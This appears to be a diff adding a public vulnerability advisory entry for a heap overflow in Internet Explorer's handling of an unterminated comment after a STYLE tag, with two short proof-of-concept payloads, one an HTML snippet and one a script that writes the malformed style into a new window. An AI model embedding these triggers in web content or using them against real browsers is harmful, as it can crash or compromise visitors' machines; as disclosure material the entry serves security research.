@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/10816/info
+
+A heap overflow vulnerability has been discovered in Internet Explorer. It is reported that the issue presents itself when a comment character sequence that is not terminated is encountered after a STYLE tag.
+
+This issue could be exploited by a remote attacker to execute arbitrary code in the context of the client user. The attacker would likely create a malicious HTML page and host it on a site. The attacker would then attempt to entice a user to visit the malicious page to carry out a successful attack.
+
+<style>;@/* 
+
+And by "Berend-Jan Wever" <skylined@edup.tudelft.nl>:
+
+<SCRIPT>
+d = window.open().document;
+d.write("x");
+d.body.innerHTML = "<STYLE>@;/*";
+</SCRIPT>
